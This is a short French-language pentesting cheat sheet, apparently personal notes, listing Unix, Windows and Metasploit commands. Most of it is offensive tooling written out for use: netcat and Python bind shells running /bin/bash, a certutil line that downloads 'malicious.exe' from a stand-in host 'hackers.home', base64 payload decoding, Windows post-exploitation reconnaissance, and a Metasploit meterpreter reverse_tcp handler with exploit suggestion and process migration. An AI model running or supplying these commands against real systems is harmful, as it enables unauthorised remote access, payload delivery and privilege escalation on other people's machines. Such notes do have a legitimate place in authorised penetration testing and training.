<h2>Unix</h2>
Accorder les permissions pour un user specifique</br>
setfacl -m u:username:rwx myfolder</br>
Tunnel ssh dynamique sur le port local 8080:</br>
ssh -ND 8080 root@addressIP</br>
<h3>Obtenir un shell</h3>
Ouvrent un shell sur le port 2222 :
<ul>
  <li>nc -lvp 2222 -e /bin/bash</li>
  <li>python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"</li>
</ul>
On se connecte avec nc -nv 2222 adress port</br>
<h4>Pour avoir un shell pty :</h4>
<ul>
  <li>python -c "import pty; pty.spawn('/bin/bash')"</li>
</ul>
<h4>Pour avoir tab completion tout joli :</h4>
<ul>
  <li>Prendre un shell pty avec la commande plus haut</li>
  <li>CTRL-Z</li>
  <li>stty raw -echo</li>
  <li>fg</li>
</ul>

Envoi fichier avec netcat :</br>
nc -l -p 1234 > out.file</br>
nc -w 3 [destination] 1234 < out.file</br>

<h2>Windows</h2>
systeminfo pour obtenir des renseignements sur le systeme</br>
net users [username] pour obtenir des renseignements sur les utilisateurs</br>
tasklist pour lister les processus</br>
netstat -ano pour les connexions reseau</br>
dir sysprep /s /b pour trouver un fichier dans le repertoire courant et ses sous-dossiers</br>
wmic qfe list pour lister les mises à jour installées</br>
certutil.exe -urlcache -split -f "https://hackers.home/malicious.exe" bad.exe le wget en cmd<br/>
certutil.exe -decode bad.txt bad.exe le base64 decode en cmd</br>

<h3>Powershell</h3>
get-WmiObject -class Win32_Share</br>


<h2>Metasploit</h2>
Handler :</br>
use exploit/multi/handler</br>
set PAYLOAD windows/x64/meterpreter/reverse_tcp</br>
set LHOST 192.168.8.142</br>
set LPORT 8888</br>
set ExitOnSession false</br>
exploit -j -z</br>

use post/multi/recon/local_exploit_suggester</br>

run post/windows/manage/migrate pour changer sur un processus plus fiable</br>
